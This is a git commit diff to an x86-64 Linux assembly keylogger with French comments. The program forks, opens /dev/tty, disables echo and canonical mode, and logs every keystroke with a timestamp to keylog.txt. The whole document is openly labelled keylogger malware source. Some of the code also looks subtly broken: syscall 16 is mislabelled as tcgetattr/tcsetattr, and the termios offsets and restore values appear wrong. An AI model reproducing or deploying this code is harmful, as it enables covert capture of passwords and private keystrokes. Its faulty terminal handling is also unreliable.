3e5580bcefdf48761d6e9a297387e9b561efaf2d
bylife <bylife@bylife.fr>
2025-02-14 16:26:21 +0100

    fix bug keyloger qui prned juste 1er input

--- keylogger.asm
+++ keylogger.asm
@@ -1,22 +1,24 @@
 section .data
     fname db "keylog.txt", 0
-    ctrl_file db "k.ctrl", 0    ; fichier ctrl pour stop
-    fd dq 0                    ; stockage fd
-    ctrl_fd dq 0               ; fd ctrl
-    tbuf db 64 dup(0)          ; buffer timestamp
-    nl db 0xa                  ; retour
-    s db " | ", 0              ; separateur
-    dpid dq 0                  ; pid du fork
+    tty_path db "/dev/tty", 0   
+    ctrl_file db "k.ctrl", 0     
+    fd dq 0                    
+    tty_fd dq 0                
+    ctrl_fd dq 0               
+    tbuf db 64 dup(0)          
+    nl db 0xa                  
+    s db " | ", 0              
+    dpid dq 0                  
 
 section .bss
-    buf resb 1                 ; stockage touche
-    tspec resq 2               ; temps
+    buf resb 1                 
+    tspec resq 2               
+    termios resb 60           ; struct termios
 
 section .text
 global _start
 
 _start:
-    ; fork process
     mov rax, 57           
     syscall
     
@@ -26,13 +28,37 @@ _start:
     jmp parent           
 
 child:
-    ; init log
+    ; ouvre log
     mov rax, 2            
     mov rdi, fname
     mov rsi, 102o        
     mov rdx, 0644o       
     syscall
     mov [fd], rax
+
+    ; ouvre tty
+    mov rax, 2
+    mov rdi, tty_path
+    mov rsi, 2           ; read-write
+    mov rdx, 0
+    syscall
+    mov [tty_fd], rax
+
+    ; get term settings
+    mov rax, 16          ; tcgetattr
+    mov rdi, [tty_fd]
+    mov rsi, termios
+    syscall
+
+    ; desactive echo et canonical mode
+    mov byte [termios+3], 0   ; c_lflag &= ~(ECHO | ICANON)
+
+    ; set term settings
+    mov rax, 16          ; tcsetattr (TCSANOW)
+    mov rdi, [tty_fd]
+    mov rsi, 2           ; TCSAFLUSH
+    mov rdx, termios
+    syscall
 
     ; init ctrl       
     mov rax, 2
@@ -55,14 +81,12 @@ loop:
     syscall
     mov [ctrl_fd], rax
 
-    ; lecture ctrl
     mov rax, 0
     mov rdi, [ctrl_fd]
     mov rsi, buf
     mov rdx, 1
     syscall
 
-    ; check stop
     cmp rax, 1           
     je exit
 
@@ -74,42 +98,41 @@ loop:
 
     ; lecture touche
     mov rax, 0                
-    mov rdi, 0                
+    mov rdi, [tty_fd]                
     mov rsi, buf
     mov rdx, 1                
     syscall
 
-    ; check erreur
     cmp rax, 0
     jle loop
 
-    ; convertir temps
+    ; converti temps
     mov rax, [tspec]
     mov rdi, tbuf
     call ft
 
-    ; ecrire temps
+    ; ecrit temps
     mov rax, 1                
     mov rdi, [fd]
     mov rsi, tbuf
     mov rdx, 20              
     syscall
 
-    ; ecrire sep
+    ; ecrit sep
     mov rax, 1
     mov rdi, [fd]
     mov rsi, s
     mov rdx, 3
     syscall
 
-    ; ecrire touche
+    ; ecrit touche
     mov rax, 1                
     mov rdi, [fd]
     mov rsi, buf
     mov rdx, 1
     syscall
 
-    ; retour ligne
+    ; retour
     mov rax, 1
     mov rdi, [fd]
     mov rsi, nl
@@ -119,29 +142,37 @@ loop:
     jmp loop
 
 parent:
-    ; cmd stop
     mov rax, 2            
     mov rdi, ctrl_file
     mov rsi, 102o        
     mov rdx, 0644o       
     syscall
 
-    ; sortie parent
     mov rax, 60              
     xor rdi, rdi
     syscall
 
 exit:
-    ; nettoyage
+    ; restore term settings
+    mov byte [termios+3], 11  ; restore original c_lflag
+    mov rax, 16               ; tcsetattr
+    mov rdi, [tty_fd]
+    mov rsi, 2                ; TCSAFLUSH
+    mov rdx, termios
+    syscall
+
     mov rax, 3                
     mov rdi, [fd]
+    syscall
+
+    mov rax, 3                
+    mov rdi, [tty_fd]
     syscall
 
     mov rax, 3
     mov rdi, [ctrl_fd]
     syscall
 
-    ; supprime ctrl
     mov rax, 87               
     mov rdi, ctrl_file
     syscall
